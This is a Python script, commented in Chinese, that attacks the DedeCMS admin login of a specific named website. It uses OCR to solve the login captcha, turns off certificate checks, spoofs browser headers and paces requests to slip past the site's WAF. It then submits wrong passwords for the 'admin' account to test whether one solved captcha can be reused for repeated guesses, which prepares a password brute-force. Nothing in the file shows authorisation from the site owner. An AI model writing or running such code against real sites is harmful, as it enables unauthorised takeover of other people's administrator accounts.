#!/usr/bin/env python3
"""test_captcha_reuse.py - 测试DedeCMS验证码复用性
同一session同一验证码连续尝试多个密码, 看是否都返回"密码错误"(=可复用) 
"""
import urllib.request, urllib.parse, ssl, re, http.cookiejar, io, time
import ddddocr
from PIL import Image

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
       'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
       'Accept-Language': 'zh-CN,zh;q=0.9',
       'Accept-Encoding': 'identity',
       'Connection': 'keep-alive',
       'Referer': 'http://chinaglass.club/admin/login.php'}
BASE = 'http://chinaglass.club'
ocr = ddddocr.DdddOcr(show_ad=False)
ocrb = ddddocr.DdddOcr(show_ad=False, beta=True)

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
opener.open(urllib.request.Request(BASE + '/admin/login.php', headers=UA), timeout=10).read()

# 取一次验证码
for attempt in range(8):
    time.sleep(3)  # 每次请求间隔, 避免WAF限频
    r = opener.open(urllib.request.Request(BASE + '/include/vdimgck.php', headers=UA), timeout=10)
    img = r.read()
    im = Image.open(io.BytesIO(img)).convert('L')
    im = im.resize((im.width * 3, im.height * 3), Image.LANCZOS)
    im = im.point(lambda p: 255 if p > 130 else 0)
    buf = io.BytesIO(); im.save(buf, 'PNG')
    c1 = ocr.classification(img)
    c2 = ocrb.classification(buf.getvalue())
    code = c1 if c1 == c2 else (c2 if len(c2) == 4 else c1)
    print('captcha attempt %d: %s' % (attempt, code))
    # 用这个code试错误密码
    data = urllib.parse.urlencode({'gotopage': '/admin/', 'dopost': 'login', 'adminstyle': 'newdedecms',
                                   'userid': 'admin', 'pwd': 'WRONG1', 'validate': code}).encode()
    req = urllib.request.Request(BASE + '/admin/login.php', data=data,
                                 headers={**UA, 'Content-Type': 'application/x-www-form-urlencoded',
                                          'Referer': BASE + '/admin/login.php'})
    r2 = opener.open(req, timeout=10)
    b = r2.read(4000).decode('gbk', 'ignore')
    if '楠岃瘉鐮佷笉姝' in b:
        print('  -> captcha wrong, retry')
        time.sleep(3)
        continue
    print('  -> captcha OK! code=%s' % code)
    # 同一验证码再试第二个密码
    data2 = urllib.parse.urlencode({'gotopage': '/admin/', 'dopost': 'login', 'adminstyle': 'newdedecms',
                                    'userid': 'admin', 'pwd': 'WRONG2', 'validate': code}).encode()
    req2 = urllib.request.Request(BASE + '/admin/login.php', data=data2,
                                  headers={**UA, 'Content-Type': 'application/x-www-form-urlencoded',
                                           'Referer': BASE + '/admin/login.php'})
    r3 = opener.open(req2, timeout=10)
    b3 = r3.read(4000).decode('gbk', 'ignore')
    if '楠岃瘉鐮佷笉姝' in b3:
        print('  -> 2nd try: captcha EXPIRED (not reusable)')
    elif '浣犵殑瀵嗙爜閿欒' in b3:
        print('  -> 2nd try: PASSWORD WRONG (captcha REUSABLE!)')
    else:
        print('  -> 2nd try: OTHER %s' % b3[:100])
    break
